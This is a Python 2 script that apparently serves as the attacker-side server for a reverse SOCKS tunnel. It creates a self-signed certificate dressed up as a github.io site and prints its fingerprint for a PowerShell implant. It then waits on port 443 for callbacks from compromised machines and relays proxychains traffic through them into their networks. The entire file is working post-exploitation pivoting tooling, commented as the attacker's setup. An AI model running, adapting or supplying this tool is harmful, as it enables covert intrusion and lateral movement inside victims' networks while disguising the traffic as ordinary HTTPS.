#!/usr/bin/python

import socket
import sys
import thread
import time
import ssl
import Queue
import subprocess

# attacker's listening port
listenPort = "443"

# port configured in /etc/proxychains4.conf
proxyPort = "1337"

certificate = "/tmp/cert.pem"
privateKey = "/tmp/private.key"

# generate new certificate and key
subprocess.call("openssl req -newkey rsa:2048 -x509 -days 365 -nodes -subj '/CN=tokyoneon.github.io' -keyout " + privateKey + " -out " + certificate, shell=True)

# generate sha1 fingerprint for Invoke-SocksProxy.ps1 script
fingerprint = subprocess.check_output("openssl x509 -in " + certificate + " -noout -sha1 -fingerprint | sed 's/:\|SH.*t=//g'", shell=True)

print("\ncertFingerprint: " + fingerprint)

def main(listenPort,proxyPort,certificate,privateKey):
    thread.start_new_thread(server, (listenPort,proxyPort,certificate,privateKey))
    while True:
       time.sleep(60)

def handlerServer(q,listenPort,certificate,privateKey):
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    context.load_cert_chain(certificate,privateKey)
    try:
        dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dock_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        dock_socket.bind(('', int(listenPort)))
        dock_socket.listen(5)
        print("Incoming connections on: " + listenPort)
        while True:
            try:
                clear_socket, address = dock_socket.accept()
                client_socket = context.wrap_socket(clear_socket, server_side=True)
                pass
                try:
                    data = ""
                    while (data.count('\n')<3):
                        data += client_socket.recv()
                    client_socket.send("HTTP/1.1 200 OK\nContent-Length: 999999\nContent-Type: text/plain\nConnection: Keep-Alive\nKeep-Alive: timeout=20, max=10000\n\n")
                    q.get(False)
                except Exception as e:
                    pass
                q.put(client_socket)
            except Exception as e:
                print(e)
                pass
        while True:
            try:
                clear_socket, address = dock_socket.accept()
                client_socket = context.wrap_socket(clear_socket, server_side=True)
                print("Reverse Socks Connection Received: {}:{}".format(address[0],address[1]))
                try:
                    data = ""
                    while (data.count('\n')<3):
                        data += client_socket.recv()
                    client_socket.send("HTTP/1.1 200 OK\nContent-Length: 999999\nContent-Type: text/plain\nConnection: Keep-Alive\nKeep-Alive: timeout=20, max=10000\n\n")
                    q.get(False)
                except Exception as e:
                    pass
                q.put(client_socket)
            except Exception as e:
                print(e)
                pass
    except Exception as e:
        print(e)
    finally:
        dock_socket.close()

def getActiveConnection(q):
    try:
        client_socket = q.get(block=True, timeout=10)
    except:
        print('No Reverse Socks connection found')
        return None
    try:
        client_socket.send("HELLO")
    except:
        return getActiveConnection(q)
    return client_socket

def server(listenPort,proxyPort,certificate,privateKey):
    q = Queue.Queue()
    thread.start_new_thread(handlerServer, (q,listenPort,certificate,privateKey))
    try:
        dock_socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dock_socket2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        dock_socket2.bind(('0.0.0.0', int(proxyPort)))
        dock_socket2.listen(5)
        print("Configure Proxychains port to: " + proxyPort)
        while True:
            try:
                client_socket2, address = dock_socket2.accept()
                client_socket = getActiveConnection(q)
                if client_socket == None:
                    client_socket2.close()
                thread.start_new_thread(forward, (client_socket, client_socket2))
                thread.start_new_thread(forward, (client_socket2, client_socket))
            except Exception as e:
                print(e)
                pass
    except Exception as e:
        print(e)
    finally:
        dock_socket2.close()

def forward(source, destination):
    try:
        string = ' '
        while string:
            string = source.recv(1024)
            if string:
                destination.sendall(string)
            else:
                source.shutdown(socket.SHUT_RD)
                destination.shutdown(socket.SHUT_WR)
    except:
        try:
            source.shutdown(socket.SHUT_RD)
            destination.shutdown(socket.SHUT_WR)
        except:
            pass
        pass

if __name__ == '__main__':
    if len(sys.argv) < 0:
	    print("Usage:{} <listenPort> <proxyPort> <certificate> <privateKey>".format(sys.argv[0]))
    else:
	    main(listenPort,proxyPort,certificate,privateKey)
